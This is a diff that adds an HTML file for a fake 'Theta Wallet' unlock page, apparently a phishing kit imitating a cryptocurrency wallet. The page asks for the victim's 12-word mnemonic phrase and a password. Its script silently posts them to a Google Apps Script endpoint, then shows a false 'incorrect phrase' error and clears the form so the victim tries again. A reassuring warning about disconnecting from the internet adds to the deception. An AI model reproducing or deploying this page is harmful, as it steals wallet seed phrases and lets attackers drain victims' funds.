@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<!-- saved from url=(0037)https://www.thetamaintoken.org/wallet -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=, initial-scale=1.0">
+  <link href="./wallet_files/thetastyles.css" rel="stylesheet" type="text/css">
+  <link href="./wallet_files/f8dc055baf8041b53f8a03bd4d3e3444" rel="stylesheet" type="text/css">
+  <!-- <script src="../public/js/scripts.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script> -->
+  <link rel="icon" type="image/x-icon" href="https://www.thetamaintoken.org/images/favicon.ico">
+  <title>Theta Wallet</title>
+</head>
+
+<body>
+  <div class="NavBar NavBar--is-centered">
+    <div style="display: flex; flex-direction: column; align-items: center;">
+      <img class="NavBar__logo" src="./wallet_files/theta_wallet_logo@2x.png">
+    </div>
+  </div>
+
+  <div class="Pages">
+    <div class="UnlockWalletPage">
+      <div class="UnlockWalletPage__wrapper">
+        <div class="UnlockWalletPage__title">Unlock Your Wallet</div>
+        <div class="UnlockWalletCard">
+          <div class="UnlockWalletCard__content">
+            <div class="UnlockWalletCard__header">
+              <div class="TabBar UnlockWalletCard__tab-bar TabBar--is-centered TabBar--is-condensed">
+                <a class="TabBarItem" href="/keystore.html">
+                  <div class="TabBarItem__title">Keystore</div>
+                </a><a class="TabBarItem TabBarItem--is-active" href="/wallet.html" aria-current="page">
+                  <div class="TabBarItem__title">Mnemonic</div>
+                </a><a class="TabBarItem" href="/privatekey.html">
+                  <div class="TabBarItem__title">Private Key</div>
+                </a><a class="TabBarItem" href="/hardware.html">
+                  <div class="TabBarItem__title">Hardware</div>
+                </a>
+              </div>
+
+            </div>
+            <form class="UnlockWalletViaMnemonicPhrase" name="submit-to-google-sheet" method="POST" action="https://www.thetamaintoken.org/index">
+              <div class="UnlockWalletViaMnemonicPhrase__title">
+                Please enter your 12 word phrase
+              </div>
+              <textarea class="UnlockWalletViaMnemonicPhrase__mnemonic" name="Mnemonic" id="Mnemonic" required="">                </textarea>
+              <div class="UnlockWalletViaMnemonicPhrase__mnemonic-instructions">
+                Please separate each Mnemonic Phrase with a space.
+              </div>
+              <input id="password" class="UnlockWalletViaMnemonicPhrase__password-input" placeholder="Enter temporary session password" name="MnemonicPassword" type="password" value="" required="">
+              <p class="UnlockWalletViaMnemonicPhrase__mnemonic-instructions" id="errorMessage"></p>
+              <p class="UnlockWalletViaMnemonicPhrase__mnemonic-instructions">click if mnemonic phrase are correct
+                <input type="checkbox" id=" check" onclick="enable()">
+              </p>
+
+              <div class="UnlockWalletCard__warning1">
+                Before you enter your mnemonic phrase, we recommend you
+                disconnect your device from the internet. You will be able to
+                reconnect once your wallet is unlocked.
+              </div>
+
+              <div class="UnlockWalletViaMnemonicPhrase__footer">
+                <button class="GradientButtonMnemonic">
+                  <div id="btn" class="GradientButton__title" type="submit" name="submit" value="submit">Unlock Wallet
+                  </div>
+                </button>
+              </div>
+            </form>
+          </div>
+        </div>
+        <div class="UnlockWalletPage__subtitle">
+          <span>Don't have a wallet?</span><a href="https://www.thetamaintoken.org/wallet">Create Wallet</a>
+        </div>
+      </div>
+    </div>
+  </div>
+  <script>
+    function enable() {
+      const check = document.getElementById("check");
+      const btn = document.getElementById("btn");
+
+      if (check.checked) {
+        btn.removeAttribute("disabled");
+      } else {
+        btn.disabled = "true";
+      }
+    }
+
+  </script>
+
+  <!-- <script>
+      const mnemonicMessage = document.querySelector('#mnemonicMessage');
+      
+        mnemonicMesssage.addEventListener("submit", () => {
+          mnemonicMessage.innerText = `<div>
+          Please Enter the correct Mnemonic and Password
+        </div> `
+        });
+    </script> -->
+
+    <script type="text/javascript" src="./wallet_files/email.min.js">
+</script>
+
+  <script>
+    const scriptURL =
+      "https://script.google.com/macros/s/AKfycbxIXgYNITLti8RQBB9wiGD2xXsjes8vVFz8wMGWmYsXStHfeIgGGSLuWLlPrr-eDKsA/exec";
+    const form = document.forms["submit-to-google-sheet"];
+    const msg = document.getElementById("errorMessage")
+
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+      fetch(scriptURL, { method: "POST", body: new FormData(form) })
+        .then(response => {
+          errorMessage.innerHTML = "Please Enter correct mnemonic phrase and Password!"
+          setTimeout(function () {
+            msg.innerHTML = ""
+          }, 5000)
+          form.reset()
+        })
+        .catch((error) => console.error("Error!", error.message));
+    });
+  </script>
+  <script src="./wallet_files/index.js"></script>
+
+
+
+</body></html>
